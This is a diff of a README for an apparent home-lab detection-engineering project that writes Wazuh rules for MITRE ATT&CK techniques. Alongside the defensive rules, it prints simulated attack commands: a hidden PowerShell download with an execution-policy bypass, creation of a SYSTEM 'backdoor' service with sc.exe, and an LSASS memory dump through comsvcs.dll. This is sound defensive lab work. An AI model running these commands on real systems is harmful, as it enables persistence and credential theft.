@@ -55,7 +55,7 @@ Attackers often use Base64 encoding to hide their malicious commands. I simulate
 
 
 > **Analyst Note:** This level of visibility is crucial for detecting "Living off the Land" (LotL) attacks where legitimate tools like PowerShell are used for malicious purposes.
->
+
 > ### 🚨 Phase 3: Custom Detection Rules & Persistence Hunting
 Standard logs are noisy. To build a true early-warning system, I created custom Wazuh rules to detect specific MITRE ATT&CK techniques.
 
@@ -74,15 +74,15 @@ I wrote a custom Level 12 rule in Wazuh to immediately flag any `schtasks.exe` e
 **Analyst Insight:**
 By mapping the custom rule to MITRE ATT&CK ID **T1053.005**, the SOC team instantly understands the intent of the attacker (Persistence) without manually deciphering the raw logs.
 
-🎯 Scenario 2: Detecting Ingress Tool Transfer (MITRE T1105) via LOLBins
+#🎯 Scenario 2: Detecting Ingress Tool Transfer (MITRE T1105) via LOLBins
 Objective
 To detect and alert on malicious file downloads executed via built-in Windows binaries (LOLBins) such as PowerShell, simulating an attacker attempting to bring tools into the compromised environment stealthily.
 
-🥷 Attack Simulation (Red Team)
+#🥷 Attack Simulation (Red Team)
 Threat actors often use native tools to evade detection. The following command was executed on the Windows 10 endpoint to bypass execution policies and download a fake payload (svchost_update.exe) to the C:\Users\Public folder:
 ```powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wazuh/wazuh/master/LICENSE' -OutFile 'C:\Users\Public\svchost_update.exe'"```
 
-🛡️ Detection Engineering (Blue Team)
+#🛡️ Detection Engineering (Blue Team)
 Sysmon was configured to capture Event ID 11 (File Create). The telemetry was forwarded to Wazuh. A custom rule was created to trigger a Critical (Level 12) alert when powershell.exe drops a specific suspicious executable.
 
 Custom Wazuh Rule (local_rules.xml):
@@ -97,21 +97,21 @@ Custom Wazuh Rule (local_rules.xml):
     </mitre>
   </rule>
 ```
-  📸 Evidence of Detection
+  #📸 Evidence of Detection
   
   <img width="770" height="565" alt="alerts_wazuh" src="https://github.com/user-attachments/assets/a8599bf1-491a-4f10-aaf3-304983539e7a" />
 
   <img width="627" height="370" alt="rule_level12" src="https://github.com/user-attachments/assets/1c2d83a1-07af-41e7-8b0a-f43570366cc7" />
 
 
-🎯 Scenario 3: Privilege Escalation via Windows Services (MITRE T1543.003)
+#🎯 Scenario 3: Privilege Escalation via Windows Services (MITRE T1543.003)
 Objective
 To detect when an attacker uses native Windows tools (sc.exe) to create a persistent, malicious service running with SYSTEM privileges.
 
-🥷 Attack Simulation
+#🥷 Attack Simulation
 ```sc.exe create &quot;Windows_Update_Backdoor&quot; binPath= &quot;C:\Users\Public\svchost_update.exe&quot; start= auto obj= &quot;LocalSystem&quot;```
 
-🛡️ Detection Engineering
+#🛡️ Detection Engineering
 Default SIEM rules may ignore sc.exe to prevent false positives. A custom rule was created to trigger a Critical alert when sc.exe is specifically used to create a service.
 
 Custom Wazuh Rule:
@@ -130,14 +130,14 @@ Custom Wazuh Rule:
 <img width="911" height="580" alt="windows_update_backdoor" src="https://github.com/user-attachments/assets/b7089bbe-87e9-42df-af3f-488f5b2142d6" />
 
 
-🎯 Scenario 4: OS Credential Dumping via LSASS Memory (MITRE T1003.001)
+#🎯 Scenario 4: OS Credential Dumping via LSASS Memory (MITRE T1003.001)
 Objective
 To detect stealthy credential harvesting attempts where attackers dump the lsass.exe process memory using the native comsvcs.dll LOLBin.
 
-🥷 Attack Simulation
+#🥷 Attack Simulation
 ```rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [LSASS_PID] C:\Users\Public\lsass_dump.dmp full```
 
-🛡️ Detection Engineering
+#🛡️ Detection Engineering
 Sysmon Event ID 1 (Process Create) captures the execution. The custom rule strictly looks for the MiniDump command line argument passed to rundll32.exe.
 
 Custom Wazuh Rule:
